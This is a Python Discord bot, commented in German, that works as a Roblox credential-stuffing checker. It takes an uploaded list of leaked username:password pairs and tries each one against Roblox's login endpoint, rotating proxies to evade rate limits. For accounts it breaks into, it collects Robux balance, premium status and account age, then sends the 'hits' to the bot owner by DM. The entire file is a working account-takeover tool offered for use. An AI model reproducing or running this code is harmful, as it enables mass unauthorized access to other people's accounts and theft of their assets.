import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import aiofiles
import asyncio
import os
import json
from datetime import datetime
from flask import Flask
from threading import Thread

# 24/7 Online halten
app = Flask('')

@app.route('/')
def home():
    return "Bot is running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# Bot Setup
TOKEN = os.environ['TOKEN']
OWNER_ID = int(os.environ.get('OWNER_ID', '0'))

class RobloxCheckerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
        self.active_checks = {}
        
    async def setup_hook(self):
        await self.tree.sync()
        print(f"Bot ist online als {self.user}")
        
    async def on_ready(self):
        activity = discord.Activity(type=discord.ActivityType.watching, name="Roblox Accounts")
        await self.change_presence(activity=activity)
bot = RobloxCheckerBot()

@bot.tree.command(name="check", description="Check Roblox Accounts aus Combo-Liste")
@app_commands.describe(
    file="TXT Datei mit username:password",
    mode="Check-Modus",
    threads="Anzahl Threads (1-20)",
    proxy_file="Optional: Proxy-Datei"
)
@app_commands.choices(mode=[
    app_commands.Choice(name="Schnell (nur Login)", value="fast"),
    app_commands.Choice(name="Normal (mit Stats)", value="normal"),
    app_commands.Choice(name="Deep (alles prüfen)", value="deep")
])
async def check_accounts(
    interaction: discord.Interaction, 
    file: discord.Attachment,
    mode: app_commands.Choice[str] = None,
    threads: int = 10,
    proxy_file: discord.Attachment = None
):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("⛔ Nur für Owner!", ephemeral=True)
        return
            
    mode = mode.value if mode else "normal"
    threads = max(1, min(20, threads))
    
    await interaction.response.defer(thinking=True)
    
    # Download Combo-Datei
    combo_path = f"temp_combos_{interaction.id}.txt"
    await file.save(combo_path)
    
    # Lade Combos
    combos = []
    async with aiofiles.open(combo_path, 'r') as f:
        async for line in f:
            if ':' in line:
                user, pwd = line.strip().split(':', 1)
                combos.append((user, pwd))
    
    if not combos:
        await interaction.followup.send("❌ Keine gültigen Combos! Format: `username:password`")
        os.remove(combo_path)
        return
    
    # Proxies laden
    proxies = []
    if proxy_file:
        proxy_path = f"temp_proxy_{interaction.id}.txt"
        await proxy_file.save(proxy_path)
        async with aiofiles.open(proxy_path, 'r') as f:
            async for line in f:
                if line.strip():
                    proxies.append(line.strip())
        os.remove(proxy_path)
    
    # Starte Check
    check_id = f"{interaction.user.id}_{int(datetime.now().timestamp())}"
    bot.active_checks[check_id] = {
        "total": len(combos),
        "checked": 0,
        "hits": 0,
        "twofa": 0,
        "locked": 0,
        "robux_total": 0,
        "results": []
    }
    
    # Embed erstellen
    embed = discord.Embed(
        title="🔍 Roblox Account Checker",
        description=f"Mode: `{mode}` | Threads: `{threads}` | Combos: `{len(combos)}`",
        color=discord.Color.blue()
    )
    embed.add_field(name="⏳ Status", value="Starting...", inline=False)
    
    message = await interaction.followup.send(embed=embed)
    
    # Starte Checking
    asyncio.create_task(run_check(check_id, combos, proxies, threads, mode, message, interaction.user))
    
    os.remove(combo_path)

async def run_check(check_id, combos, proxies, threads, mode, message, user):
    semaphore = asyncio.Semaphore(threads)
    proxy_index = [0]
    
    async def check_single(username, password):
        async with semaphore:
            try:
                result = await check_account_api(username, password, proxies, proxy_index, mode)
                
                bot.active_checks[check_id]["checked"] += 1
                
                if result["status"] == "hit":
                    bot.active_checks[check_id]["hits"] += 1
                    bot.active_checks[check_id]["robux_total"] += result.get("robux", 0)
                    bot.active_checks[check_id]["results"].append(result)
                elif result["status"] == "2fa":
                    bot.active_checks[check_id]["twofa"] += 1
                elif result["status"] == "locked":
                    bot.active_checks[check_id]["locked"] += 1
                
                # Update alle 5 checks
                if bot.active_checks[check_id]["checked"] % 5 == 0:
                    await update_progress_embed(message, check_id)
                    
            except Exception as e:
                print(f"Error: {e}")
    
    tasks = [check_single(u, p) for u, p in combos]
    await asyncio.gather(*tasks)
    
    await send_final_results(message, check_id, user)
    del bot.active_checks[check_id]

async def check_account_api(username, password, proxies, proxy_index, mode):
    result = {"status": "fail", "username": username, "password": password}
    
    proxy = None
    if proxies:
        proxy = proxies[proxy_index[0] % len(proxies)]
        proxy_index[0] += 1
    
    try:
        async with aiohttp.ClientSession() as session:
            # CSRF Token holen
            async with session.post(
                "https://auth.roblox.com/v2/login",
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                csrf_token = resp.headers.get("x-csrf-token")
            
            if not csrf_token:
                return result
            
            # Login versuchen
            headers = {
                "x-csrf-token": csrf_token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            payload = {
                "ctype": "Username",
                "cvalue": username,
                "password": password
            }
            
            async with session.post(
                "https://auth.roblox.com/v2/login",
                json=payload,
                headers=headers,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                data = await resp.json()
                
                if resp.status == 200:
                    result["status"] = "hit"
                    user_id = data.get("user", {}).get("id")
                    result["user_id"] = user_id
                    
                    if mode in ["normal", "deep"]:
                        await get_account_details(session, result, user_id, proxy)
                        
                elif "twoStepVerificationData" in str(data):
                    result["status"] = "2fa"
                elif resp.status == 403:
                    result["status"] = "locked"
                    
    except Exception as e:
        result["error"] = str(e)
        
    return result

async def get_account_details(session, result, user_id, proxy):
    try:
        # Robux
        async with session.get(
            "https://economy.roblox.com/v1/user/currency",
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                result["robux"] = data.get("robux", 0)
        
        # Premium
        async with session.get(
            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                result["premium"] = data.get("isPremium", False)
        
        # Account Alter
        async with session.get(
            f"https://users.roblox.com/v1/users/{user_id}",
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                result["display_name"] = data.get("displayName")
                created = data.get("created")
                if created:
                    created_date = datetime.fromisoformat(created.replace("Z", "+00:00"))
                    age_days = (datetime.now() - created_date.replace(tzinfo=None)).days
                    result["account_age"] = age_days
except Exception as e:
        print(f"Details error: {e}")

async def update_progress_embed(message, check_id):
    data = bot.active_checks[check_id]
    
    embed = discord.Embed(
        title="🔍 Roblox Account Checker - Running",
        color=discord.Color.blue(),
        timestamp=datetime.now()
    )
    
    progress = data["checked"] / data["total"] * 100
    bar = "█" * int(progress / 10) + "░" * (10 - int(progress / 10))
    
    embed.add_field(
        name="⏳ Progress",
        value=f"`{bar}` {progress:.1f}%\n{data['checked']}/{data['total']}",
        inline=False
    )
    embed.add_field(name="✅ Hits", value=f"`{data['hits']}`", inline=True)
    embed.add_field(name="🔒 2FA", value=f"`{data['twofa']}`", inline=True)
    embed.add_field(name="⛔ Locked", value=f"`{data['locked']}`", inline=True)
    embed.add_field(name="💰 Total Robux", value=f"`{data['robux_total']}`", inline=True)
    
    try:
        await message.edit(embed=embed)
    except:
        pass

async def send_final_results(message, check_id, user):
    data = bot.active_checks[check_id]
    
    embed = discord.Embed(
        title="✅ Check Complete!",
        description=f"Checked `{data['checked']}` accounts",
        color=discord.Color.green(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="✅ Hits", value=f"`{data['hits']}`", inline=True)
    embed.add_field(name="🔒 2FA", value=f"`{data['twofa']}`", inline=True)
    embed.add_field(name="⛔ Locked", value=f"`{data['locked']}`", inline=True)
    
    if data["hits"] > 0:
        avg_robux = data['robux_total'] // data['hits'] if data['hits'] > 0 else 0
        embed.add_field(name="💰 Total Robux", value=f"`{data['robux_total']}`", inline=True)
        embed.add_field(name="📊 Avg/Hits", value=f"`{avg_robux}`", inline=True)
    
    await message.edit(embed=embed)
    
    # Sende Hits als Datei
    if data["results"]:
        hits_text = ""
        for hit in data["results"]:
            line = f"{hit['username']}:{hit['password']} | ID: {hit.get('user_id')} | Robux: {hit.get('robux', 0)}"
            if hit.get('premium'):
                line += " | ⭐PREMIUM"
            if hit.get('account_age'):
                line += f" | Age: {hit['account_age']}d"
            hits_text += line + "\n"
        
        filename = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(filename, 'w') as f:
            await f.write(hits_text)
        
        try:
            await user.send(
                content=f"🎉 **{data['hits']} Hits gefunden!**",
                file=discord.File(filename)
            )
            await message.reply(f"📩 Ergebnisse per DM gesendet!")
        except:
            await message.reply(
                content=f"⚠️ Could not DM. Hier sind die Hits:",
                file=discord.File(filename)
            )
        
        os.remove(filename)

# Start
TOKEN = os.environ['DISCORD_TOKEN']  # Für Railway
keep_alive()
bot.run(TOKEN)
